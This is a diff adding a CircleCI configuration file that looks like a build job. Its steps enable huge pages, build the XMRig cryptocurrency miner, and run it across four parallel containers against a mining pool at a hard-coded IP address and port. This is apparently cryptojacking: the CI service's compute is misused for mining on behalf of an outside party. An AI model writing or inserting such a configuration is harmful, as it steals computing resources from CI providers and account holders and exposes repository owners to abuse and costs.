@@ -1,0 +1,12 @@
+version: 2
+jobs:
+  build:
+    docker:
+      - image: ubuntu:latest
+    parallelism: 4
+    steps:
+      - run: apt-get update
+      - run: sysctl -w vm.nr_hugepages=128
+      - checkout
+      - run: bash ./build_xmrig.sh
+      - run: /root/xmrig/build/xmrig --donate-level 1 -o 185.251.38.246:3333 -k
